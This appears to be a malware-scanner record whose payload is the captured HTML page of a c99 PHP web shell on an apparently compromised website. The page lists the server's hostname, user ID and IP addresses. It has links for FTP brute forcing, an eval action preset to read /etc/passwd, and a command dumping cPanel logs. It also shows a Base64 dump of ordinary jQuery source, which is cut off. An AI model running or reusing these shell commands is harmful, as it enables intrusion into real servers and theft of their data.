{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "mkdir": "May create a directory",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&sort=0a\"><b>thickbox/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.23 GB of 389.31 GB (61.71%)</b><br><b>Your ip: <a href=http://87.177.180.196>87.177.180.196</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[js]&nbsp;jquery-latest.js (93.62 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>[txt]</font></a> (<a href=\"?act=f&f=jquery-latest.js&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/thickbox/jquery-latest.js</td></tr><tr><td><b>Size</b></td><td> 93.62 KB</td></tr><tr><td><b>MD5</b></td><td> 807aac0afa686d7558985eb4840af075</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=jquery-latest.js&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:25:58</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 01:36:12</td></tr><tr><td><b>MODIFY time</b></td><td> 04/03/2010 17:21:10</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>28 66 75 6E 63 74 69 6F 6E 28 29 7B 0A 2F 2A 0A 20 2A 20 6A 51 75 65 72 <br>79 20 31 2E 32 2E 33 61 20 2D 20 4E 65 77 20 57 61 76 65 20 4A 61 76 61 <br>73 63 72 69 70 74 0A 20 2A 0A 20 2A 20 43 6F 70 79 72 69 67 68 74 20 28 <br>63 29 20 32 30 30 37 20 4A 6F 68 6E 20 52 65 73 69 67 20 28 6A 71 75 65 <br>72 79 2E 63 6F 6D 29 0A 20 2A 20 44 75 61 6C 20 6C 69 63 65 6E 73 65 64 <br>20 75 6E 64 65 72 20 74 68 65 20 4D 49 54 20 28 4D 49 54 2D 4C 49 43 45 <br>4E 53 45 2E 74 78 74 29 0A 20 2A 20 61 6E 64 20 47 50 4C 20 28 47 50 4C <br>2D 4C 49 43 45 4E 53 45 2E 74 78 74 29 20 6C 69 63 65 6E 73 65 73 2E 0A <br></td><td bgcolor=000000>(function(){&nbsp;/*&nbsp;&nbsp;*&nbsp;jQuer<br>y&nbsp;1.2.3a&nbsp;-&nbsp;New&nbsp;Wave&nbsp;Java<br>script&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;Copyright&nbsp;(<br>c)&nbsp;2007&nbsp;John&nbsp;Resig&nbsp;(jque<br>ry.com)&nbsp;&nbsp;*&nbsp;Dual&nbsp;licensed<br>&nbsp;under&nbsp;the&nbsp;MIT&nbsp;(MIT-LICE<br>NSE.txt)&nbsp;&nbsp;*&nbsp;and&nbsp;GPL&nbsp;(GPL<br>-LICENSE.txt)&nbsp;licenses.&nbsp;<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10>KGZ1bmN0aW9uKCl7Ci8qCiAqIGpRdWVyeSAxLjIuM2EgLSBOZXcgV2F2ZSBKYXZhc2NyaXB0CiAqCiAqIENvcHlyaWdodCAoYykgMjAwNyBKb2huIFJlc2lnIChqcXVlcnkuY29tKQogKiBEdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSBNSVQgKE1JVC1MSUNFTlNFLnR4dCkKICogYW5kIEdQTCAoR1BMLUxJQ0VOU0UudHh0KSBsaWNlbnNlcy4KICoKICogJERhdGU6IDIwMDgtMDEtMjggMTE6Mzc6NDYgLTA4MDAgKE1vbiwgMjggSmFuIDIwMDgpICQKICogJFJldjogNDU1MCAkCiAqLwoKLy8gTWFwIG92ZXIgalF1ZXJ5IGluIGNhc2Ugb2Ygb3ZlcndyaXRlCmlmICggd2luZG93LmpRdWVyeSApCgl2YXIgX2pRdWVyeSA9IHdpbmRvdy5qUXVlcnk7Cgp2YXIgalF1ZXJ5ID0gd2luZG93LmpRdWVyeSA9IGZ1bmN0aW9uKCBzZWxlY3RvciwgY29udGV4dCApIHsKCS8vIFRoZSBqUXVlcnkgb2JqZWN0IGlzIGFjdHVhbGx5IGp1c3QgdGhlIGluaXQgY29uc3RydWN0b3IgJ2VuaGFuY2VkJwoJcmV0dXJuIG5ldyBqUXVlcnkucHJvdG90eXBlLmluaXQoIHNlbGVjdG9yLCBjb250ZXh0ICk7Cn07CgovLyBNYXAgb3ZlciB0aGUgJCBpbiBjYXNlIG9mIG92ZXJ3cml0ZQppZiAoIHdpbmRvdy4kICkKCXZhciBfJCA9IHdpbmRvdy4kOwoJCi8vIE1hcCB0aGUgalF1ZXJ5IG5hbWVzcGFjZSB0byB0aGUgJyQnIG9uZQp3aW5kb3cuJCA9IGpRdWVyeTsKCi8vIEEgc2ltcGxlIHdheSB0byBjaGVjayBmb3IgSFRNTCBzdHJpbmdzIG9yIElEIHN0cmluZ3MKLy8gKGJvdGggb2Ygd2hpY2ggd2Ugb3B0aW1pemUgZm9yKQp2YXIgcXVpY2tFeHByID0gL15bXjxdKig8KC58XHMpKz4pW14+XSokfF4jKFx3KykkLzsKCi8vIElzIGl0IGEgc2ltcGxlIHNlbGVjdG9yCnZhciBpc1NpbXBsZSA9IC9eLlteOiNcW1wuXSokLzsKCmpRdWVyeS5mbiA9IGpRdWVyeS5wcm90b3R5cGUgPSB7Cglpbml0OiBmdW5jdGlvbiggc2VsZWN0b3IsIGNvbnRleHQgKSB7CgkJLy8gTWFrZSBzdXJlIHRoYXQgYSBzZWxlY3Rpb24gd2FzIHByb3ZpZGVkCgkJc2VsZWN0b3IgPSBzZWxlY3RvciB8fCBkb2N1bWVudDsKCgkJLy8gSGFuZGxlICQoRE9NRWxlbWVudCkKCQlpZiAoIHNlbGVjdG9yLm5vZGVUeXBlICkgewoJCQl0aGlzWzBdID0gc2VsZWN0b3I7CgkJCXRoaXMubGVuZ3RoID0gMTsKCQkJcmV0dXJuIHRoaXM7CgoJCS8vIEhhbmRsZSBIVE1MIHN0cmluZ3MKCQl9IGVsc2UgaWYgKCB0eXBlb2Ygc2VsZWN0b3IgPT0gInN0cmluZyIgKSB7CgkJCS8vIEFyZSB3ZSBkZWFsaW5nIHdpdGggSFRNTCBzdHJpbmcgb3IgYW4gSUQ/CgkJCXZhciBtYXRjaCA9IHF1aWNrRXhwci5leGVjKCBzZWxlY3RvciApOwoKCQkJLy8gVmVyaWZ5IGEgbWF0Y2gsIGFuZCB0aGF0IG5vIGNvbnRleHQgd2FzIHNwZWNpZmllZCBmb3IgI2lkCgkJCWlmICggbWF0Y2ggJiYgKG1hdGNoWzFdIHx8ICFjb250ZXh0KSApIHsKCgkJCQkvLyBIQU5ETEU6ICQoaHRtbCkgLT4gJChhcnJheSkKCQkJCWlmICggbWF0Y2hbMV0gKQoJCQkJCXNlbGVjdG9yID0galF1ZXJ5LmNsZWFuKCBbIG1hdGNoWzFdIF0sIGNvbnRleHQgKTsKCgkJCQkvLyBIQU5ETEU6ICQoIiNpZCIpCgkJCQllbHNlIHsKCQkJCQl2YXIgZWxlbSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCBtYXRjaFszXSApOwoKCQkJCQkvLyBNYWtlIHN1cmUgYW4gZWxlbWVudCB3YXMgbG9jYXRlZAoJCQkJCWlmICggZWxlbSApCgkJCQkJCS8vIEhhbmRsZSB0aGUgY2FzZSB3aGVyZSBJRSBhbmQgT3BlcmEgcmV0dXJuIGl0ZW1zCgkJCQkJCS8vIGJ5IG5hbWUgaW5zdGVhZCBvZiBJRAoJCQkJCQlpZiAoIGVsZW0uaWQgIT0gbWF0Y2hbM10gKQoJCQkJCQkJcmV0dXJuIGpRdWVyeSgpLmZpbmQoIHNlbGVjdG9yICk7CgoJCQkJCQkvLyBPdGhlcndpc2UsIHdlIGluamVjdCB0aGUgZWxlbWVudCBkaXJlY3RseSBpbnRvIHRoZSBqUXVlcnkgb2JqZWN0CgkJCQkJCWVsc2UgewoJCQkJCQkJdGhpc1swXSA9IGVsZW07CgkJCQkJCQl0aGlzLmxlbmd0aCA9IDE7CgkJCQkJCQlyZXR1cm4gdGhpczsKCQkJCQkJfQoKCQkJCQllbHNlCgkJCQkJCXNlbGVjdG9yID0gW107CgkJCQl9CgoJCQkvLyBIQU5ETEU6ICQoZXhwciwgW2NvbnRleHRdKQoJCQkvLyAod2hpY2ggaXMganVzdCBlcXVpdmFsZW50IHRvOiAkKGNvbnRlbnQpLmZpbmQoZXhwcikKCQkJfSBlbHNlCgkJCQlyZXR1cm4gbmV3IGpRdWVyeSggY29udGV4dCApLmZpbmQoIHNlbGVjdG9yICk7CgoJCS8vIEhBTkRMRTogJChmdW5jdGlvbikKCQkvLyBTaG9ydGN1dCBmb3IgZG9jdW1lbnQgcmVhZHkKCQl9IGVsc2UgaWYgKCBqUXVlcnkuaXNGdW5jdGlvbiggc2VsZWN0b3IgKSApCgkJCXJldHVybiBuZXcgalF1ZXJ5KCBkb2N1bWVudCApWyBqUXVlcnkuZm4ucmVhZHkgPyAicmVhZHkiIDogImxvYWQiIF0oIHNlbGVjdG9yICk7CgoJCXJldHVybiB0aGlzLnNldEFycmF5KAoJCQkvLyBIQU5ETEU6ICQoYXJyYXkpCgkJCXNlbGVjdG9yLmNvbnN0cnVjdG9yID09IEFycmF5ICYmIHNlbGVjdG9yIHx8CgoJCQkvLyBIQU5ETEU6ICQoYXJyYXlsaWtlKQoJCQkvLyBXYXRjaCBmb3Igd2hlbiBhbiBhcnJheS1saWtlIG9iamVjdCwgY29udGFpbnMgRE9NIG5vZGVzLCBpcyBwYXNzZWQgaW4gYXMgdGhlIHNlbGVjdG9yCgkJCShzZWxlY3Rvci5qcXVlcnkgfHwgc2VsZWN0b3IubGVuZ3RoICYmIHNlbGVjdG9yICE9IHdpbmRvdyAmJiAhc2VsZWN0b3Iubm9kZVR5cGUgJiYgc2VsZWN0b3JbMF0gIT0gdW5kZWZpbmVkICYmIHNlbGVjdG9yWzBdLm5vZGVUeXBlKSAmJiBqUXVlcnkubWFrZUFycmF5KCBzZWxlY3RvciApIHx8CgoJCQkvLyBIQU5ETEU6ICQoKikKCQkJWyBzZWxlY3RvciBdICk7Cgl9LAoJCgkvLyBUaGUgY3VycmVudCB2ZXJzaW9uIG9mIGpRdWVyeSBiZWluZyB1c2VkCglqcXVlcnk6ICIxLjIuM2EiLAoKCS8vIFRoZSBudW1iZXIgb2YgZWxlbWVudHMgY29udGFpbmVkIGluIHRoZSBtYXRjaGVkIGVsZW1lbnQgc2V0CglzaXplOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5sZW5ndGg7Cgl9LAoJCgkvLyBUaGUgbnVtYmVyIG9mIGVsZW1lbnRzIGNvbnRhaW5lZCBpbiB0aGUgbWF0Y2hlZCBlbGVtZW50IHNldAoJbGVuZ3RoOiAwLAoKCS8vIEdldCB0aGUgTnRoIGVsZW1lbnQgaW4gdGhlIG1hdGNoZWQgZWxlbWVudCBzZXQgT1IKCS8vIEdldCB0aGUgd2hvbGUgbWF0Y2hlZCBlbGVtZW50IHNldCBhcyBhIGNsZWFuIGFycmF5CglnZXQ6IGZ1bmN0aW9uKCBudW0gKSB7CgkJcmV0dXJuIG51bSA9PSB1bmRlZmluZWQgPwoKCQkJLy8gUmV0dXJuIGEgJ2NsZWFuJyBhcnJheQoJCQlqUXVlcnkubWFrZUFycmF5KCB0aGlzICkgOgoKCQkJLy8gUmV0dXJuIGp1c3QgdGhlIG9iamVjdAoJCQl0aGlzWyBudW0gXTsKCX0sCgkKCS8vIFRha2UgYW4gYXJyYXkgb2YgZWxlbWVudHMgYW5kIHB1c2ggaXQgb250byB0aGUgc3RhY2sKCS8vIChyZXR1cm5pbmcgdGhlIG5ldyBtYXRjaGVkIGVsZW1lbnQgc2V0KQoJcHVzaFN0YWNrOiBmdW5jdGlvbiggZWxlbXMgKSB7CgkJLy8gQnVpbGQgYSBuZXcgalF1ZXJ5IG1hdGNoZWQgZWxlbWVudCBzZXQKCQl2YXIgcmV0ID0galF1ZXJ5KCBlbGVtcyApOwoKCQkvLyBBZGQgdGhlIG9sZCBvYmplY3Qgb250byB0aGUgc3RhY2sgKGFzIGEgcmVmZXJlbmNlKQoJCXJldC5wcmV2T2JqZWN0ID0gdGhpczsKCgkJLy8gUmV0dXJuIHRoZSBuZXdseS1mb3JtZWQgZWxlbWVudCBzZXQKCQlyZXR1cm4gcmV0OwoJfSwKCQoJLy8gRm9yY2UgdGhlIGN1cnJlbnQgbWF0Y2hlZCBzZXQgb2YgZWxlbWVudHMgdG8gYmVjb21lCgkvLyB0aGUgc3BlY2lmaWVkIGFycmF5IG9mIGVsZW1lbnRzIChkZXN0cm95aW5nIHRoZSBzdGFjayBpbiB0aGUgcHJvY2VzcykKCS8vIFlvdSBzaG91bGQgdXNlIHB1c2hTdGFjaygpIGluIG9yZGVyIHRvIGRvIHRoaXMsIGJ1dCBtYWludGFpbiB0aGUgc3RhY2sKCXNldEFycmF5OiBmdW5jdGlvbiggZWxlbXMgKSB7CgkJLy8gUmVzZXR0aW5nIHRoZSBsZW5ndGggdG8gMCwgdGhlbiB1c2luZyB0aGUgbmF0aXZlIEFycmF5IHB1c2gKCQkvLyBpcyBhIHN1cGVyLWZhc3Qgd2F5IHRvIHBvcHVsYXRlIGFuIG9iamVjdCB3aXRoIGFycmF5LWxpa2UgcHJvcGVydGllcwoJCXRoaXMubGVuZ3RoID0gMDsKCQlBcnJheS5wcm90b3R5cGUucHVzaC5hcHBseSggdGhpcywgZWxlbXMgKTsKCQkKCQlyZXR1cm4gdGhpczsKCX0sCgoJLy8gRXhlY3V0ZSBhIGNhbGxiYWNrIGZvciBldmVyeSBlbGVtZW50IGluIHRoZSBtYXRjaGVkIHNldC4KCS8vIChZb3UgY2FuIHNlZWQgdGhlIGFyZ3VtZW50cyB3aXRoIGFuIGFycmF5IG9mIGFyZ3MsIGJ1dCB0aGlzIGlzCgkvLyBvbmx5IHVzZWQgaW50ZXJuYWxseS4pCgllYWNoOiBmdW5jdGlvbiggY2FsbGJhY2ssIGFyZ3MgKSB7CgkJcmV0dXJuIGpRdWVyeS5lYWNoKCB0aGlzLCBjYWxsYmFjaywgYXJncyApOwoJfSwKCgkvLyBEZXRlcm1pbmUgdGhlIHBvc2l0aW9uIG9mIGFuIGVsZW1lbnQgd2l0aGluIAoJLy8gdGhlIG1hdGNoZWQgc2V0IG9mIGVsZW1lbnRzCglpbmRleDogZnVuY3Rpb24oIGVsZW0gKSB7CgkJdmFyIHJldCA9IC0xOwoKCQkvLyBMb2NhdGUgdGhlIHBvc2l0aW9uIG9mIHRoZSBkZXNpcmVkIGVsZW1lbnQKCQl0aGlzLmVhY2goZnVuY3Rpb24oaSl7CgkJCWlmICggdGhpcyA9PSBlbGVtICkKCQkJCXJldCA9IGk7CgkJfSk7CgoJCXJldHVybiByZXQ7Cgl9LAoKCWF0dHI6IGZ1bmN0aW9uKCBuYW1lLCB2YWx1ZSwgdHlwZSApIHsKCQl2YXIgb3B0aW9ucyA9IG5hbWU7CgkJCgkJLy8gTG9vayBmb3IgdGhlIGNhc2Ugd2hlcmUgd2UncmUgYWNjZXNzaW5nIGEgc3R5bGUgdmFsdWUKCQlpZiAoIG5hbWUuY29uc3RydWN0b3IgPT0gU3RyaW5nICkKCQkJaWYgKCB2YWx1ZSA9PSB1bmRlZmluZWQgKQoJCQkJcmV0dXJuIHRoaXMubGVuZ3RoICYmIGpRdWVyeVsgdHlwZSB8fCAiYXR0ciIgXSggdGhpc1swXSwgbmFtZSApIHx8IHVuZGVmaW5lZDsKCgkJCWVsc2UgewoJCQkJb3B0aW9ucyA9IHt9OwoJCQkJb3B0aW9uc1sgbmFtZSBdID0gdmFsdWU7CgkJCX0KCQkKCQkvLyBDaGVjayB0byBzZWUgaWYgd2UncmUgc2V0dGluZyBzdHlsZSB2YWx1ZXMKCQlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKGkpewoJCQkvLyBTZXQgYWxsIHRoZSBzdHlsZXMKCQkJZm9yICggbmFtZSBpbiBvcHRpb25zICkKCQkJCWpRdWVyeS5hdHRyKAoJCQkJCXR5cGUgPwoJCQkJCQl0aGlzLnN0eWxlIDoKCQkJCQkJdGhpcywKCQkJCQluYW1lLCBqUXVlcnkucHJvcCggdGhpcywgb3B0aW9uc1sgbmFtZSBdLCB0eXBlLCBpLCBuYW1lICkKCQkJCSk7CgkJfSk7Cgl9LAoKCWNzczogZnVuY3Rpb24oIGtleSwgdmFsdWUgKSB7CgkJLy8gaWdub3JlIG5lZ2F0aXZlIHdpZHRoIGFuZCBoZWlnaHQgdmFsdWVzCgkJaWYgKCAoa2V5ID09ICd3aWR0aCcgfHwga2V5ID09ICdoZWlnaHQnKSAmJiBwYXJzZUZsb2F0KHZhbHVlKSA8IDAgKQoJCQl2YWx1ZSA9IHVuZGVmaW5lZDsKCQlyZXR1cm4gdGhpcy5hdHRyKCBrZXksIHZhbHVlLCAiY3VyQ1NTIiApOwoJfSwKCgl0ZXh0OiBmdW5jdGlvbiggdGV4dCApIHsKCQlpZiAoIHR5cGVvZiB0ZXh0ICE9ICJvYmplY3QiICYmIHRleHQgIT0gbnVsbCApCgkJCXJldHVybiB0aGlzLmVtcHR5KCkuYXBwZW5kKCAodGhpc1swXSAmJiB0aGlzWzBdLm93bmVyRG9jdW1lbnQgfHwgZG9jdW1lbnQpLmNyZWF0ZVRleHROb2RlKCB0ZXh0ICkgKTsKCgkJdmFyIHJldCA9ICIiOwoKCQlqUXVlcnkuZWFjaCggdGV4dCB8fCB0aGlzLCBmdW5jdGlvbigpewoJCQlqUXVlcnkuZWFjaCggdGhpcy5jaGlsZE5vZGVzLCBmdW5jdGlvbigpewoJCQkJaWYgKCB0aGlzLm5vZGVUeXBlICE9IDggKQoJCQkJCXJldCArPSB0aGlzLm5vZGVUeXBlICE9IDEgPwoJCQkJCQl0aGlzLm5vZGVWYWx1ZSA6CgkJCQkJCWpRdWVyeS5mbi50ZXh0KCBbIHRoaXMgXSApOwoJCQl9KTsKCQl9KTsKCgkJcmV0dXJuIHJldDsKCX0sCgoJd3JhcEFsbDogZnVuY3Rpb24oIGh0bWwgKSB7CgkJaWYgKCB0aGlzWzBdICkKCQkJLy8gVGhlIGVsZW1lbnRzI